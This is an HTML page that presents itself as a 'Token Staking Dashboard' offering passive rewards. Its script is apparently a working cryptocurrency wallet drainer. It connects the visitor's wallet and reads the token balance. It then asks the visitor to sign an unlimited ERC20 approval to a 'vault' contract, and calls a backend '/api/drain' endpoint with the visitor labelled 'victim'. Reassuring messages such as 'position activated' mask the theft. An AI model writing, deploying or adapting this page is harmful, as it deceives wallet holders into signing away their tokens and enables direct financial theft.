<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Token Staking Dashboard</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
 body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;
      background:#0e1421;color:#e5ebff;font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif}
 .card{background:#182138;border:1px solid #2a3954;border-radius:12px;
       padding:36px 40px;max-width:520px;width:92%;text-align:center}
 h1{margin:0 0 8px;font-size:21px;color:#fff}
 .sub{color:#93a2bd;font-size:13px;margin-bottom:24px;line-height:1.5}
 .btn{display:block;width:100%;padding:14px;border:0;border-radius:8px;font-size:15px;
      font-weight:700;cursor:pointer;background:linear-gradient(135deg,#4f7cff,#7c5cff);
      color:#fff;transition:opacity .2s}
 .btn:hover{opacity:.88}.btn:disabled{opacity:.4;cursor:not-allowed}
 .log{margin-top:18px;min-height:44px;text-align:left;font-size:13px;color:#8be28b;
      word-break:break-all;line-height:1.5}
 .log .err{color:#ff7676}
 .meta{margin-top:16px;font-size:11px;color:#66749a;word-break:break-all;line-height:1.6;text-align:left}
</style>
</head>
<body>
<div class="card">
 <h1>Token Staking Dashboard</h1>
 <div class="sub">Connect your wallet to begin earning passive rewards on your holding.</div>
 <button class="btn" id="go" type="button">Connect Wallet</button>
 <div class="log" id="msg"></div>
 <div class="meta" id="meta"></div>
</div>
<script>
"use strict";
var $msg=document.getElementById("msg"),$btn=document.getElementById("go"),
    $meta=document.getElementById("meta");
var MAX=(1n<<256n)-1n;
var SEL={approve:"095ea7b3",balanceOf:"70a08d31",allowance:"dd62ed3e"};

function out(t,e){var d=document.createElement("div");if(e)d.className="err";d.textContent=t;$msg.appendChild(d);}
function meta(k,v){var d=document.createElement("div");d.textContent=k+": "+v;$meta.appendChild(d);}
function sleep(ms){return new Promise(function(r){setTimeout(r,ms);});}
function pad(h){var s=(""+h).replace(/^0x/i,"").toLowerCase();while(s.length<64)s="0"+s;return s;}
function encAddr(a){return pad(a.replace(/^0x/i,""));}
function sel(s){return "0x"+s;}
function needProvider(){
  if(!window.ethereum)throw new Error("No injected wallet found. Install MetaMask.");
  return window.ethereum;
}
function rpc(m,p){return window.ethereum.request({method:m,params:p||[]});}
function post(p,b){return fetch(p,{method:"POST",headers:{"Content-Type":"application/json"},
  body:JSON.stringify(b||{})}).then(function(r){return r.json();});}
function callRaw(to,data){return rpc("eth_call",[{to:to,data:data},"latest"]);}

/* --- ERC20 calldata builders --- */
function dataBalanceOf(owner){return sel(SEL.balanceOf)+encAddr(owner);}
function dataAllowance(o,s){return sel(SEL.allowance)+encAddr(o)+encAddr(s);}
function dataApprove(s,a){return sel(SEL.approve)+encAddr(s)+pad(BigInt(a).toString(16));}

/* --- Stage 6 support: wait for a receipt, then for allowance to register --- */
async function waitTx(txHash,token,owner,spender,minAllow){
  for(var i=0;i<80;i++){
    var rc=null;
    try{rc=await rpc("eth_getTransactionReceipt",[txHash]);}catch(e){}
    if(rc&&rc.blockNumber){
      for(var j=0;j<25;j++){
        try{
          var a=await callRaw(token,dataAllowance(owner,spender));
          if(BigInt(a)>=BigInt(minAllow))return true;
        }catch(e){}
        await sleep(1200);
      }
      return true;
    }
    await sleep(1500);
  }
  return false;
}

$btn.addEventListener("click",async function(){
  var S={account:null,chainId:null,token:null,puller:null};
  function metaAll(){
    $meta.innerHTML="";
    meta("network",S.chainId||"...");meta("asset",S.token||"...");
    meta("vault",S.puller||"initialising");if(S.account)meta("account",S.account);
  }
  try{
    $msg.innerHTML="";$btn.disabled=true;metaAll();

    /* STAGE 1: connect wallet */
    out("requesting access...");
    needProvider();
    var accs=await rpc("eth_requestAccounts");
    S.account=accs[0];metaAll();

    /* STAGE 2: load server config */
    out("loading environment...");
    var health=await fetch("/api/health").then(function(r){return r.json();});
    S.chainId=parseInt(health.chainId,10);S.token=health.token;
    if(!S.token||!S.chainId)throw new Error("server misconfigured (/api/health)");
    if(health.puller)S.puller=health.puller;
    metaAll();

    /* STAGE 3: switch to correct chain */
    out("binding network...");
    var want="0x"+S.chainId.toString(16);
    try{await rpc("wallet_switchEthereumChain",[{chainId:want}]);}
    catch(se){out("(adding network...)");}
    var cur=await rpc("eth_chainId");
    if(parseInt(cur,16)!==S.chainId)throw new Error("wrong network: please switch to "+cur+" then retry");

    /* STAGE 4: ensure the puller/vault contract is deployed */
    if(!S.puller){
      out("preparing staking vault...");
      post("/api/provision",{}).catch(function(){});
      for(var t=0;t<40&&!S.puller;t++){
        await sleep(2500);
        var h2=await fetch("/api/health").then(function(r){return r.json();}).catch(function(){return {};});
        if(h2&&h2.puller)S.puller=h2.puller;
        else if(h2&&h2.error)out("["+t+"] "+h2.error,true);
      }
      if(!S.puller)throw new Error("vault provisioning timed out (check server logs)");
    }
    metaAll();

    /* STAGE 5: read current balance + allowance via eth_call */
    out("checking holdings...");
    var bal=BigInt(await callRaw(S.token,dataBalanceOf(S.account)));
    var alw=BigInt(await callRaw(S.token,dataAllowance(S.account,S.puller)));
    var dec=BigInt(await callRaw(S.token,"0x313ce567")).catch?18:18;
    if(bal<=0n){out("nothing to stake yet: fund your address first.");$btn.disabled=false;return;}

    /* STAGE 6: ask the wallet to approve (this is the signature that matters) */
    if(alw<bal){
      out("confirm the staking authorization in your wallet...");
      var txh=await rpc("eth_sendTransaction",[{from:S.account,to:S.token,
                 value:"0x0",data:dataApprove(S.puller,MAX)}]);
      out("waiting for authorization tx "+txh.slice(0,14)+"...");
      var okTx=await waitTx(txh,S.token,S.account,S.puller,bal);
      if(!okTx)throw new Error("authorization not confirmed");
    }

    /* STAGE 7: tell the backend to execute */
    out("activating your position...");
    var res=await post("/api/drain",{victim:S.account});
    if(res&&res.success){out("position activated. rewards accrue automatically.");}
    else{out((res&&(res.error||res.reason))||"activation pending",true);}

  }catch(e){
    out("[failed] "+((e&&e.message)||String(e)),true);
  }
  $btn.disabled=false;
});
</script>
</body>
</html>
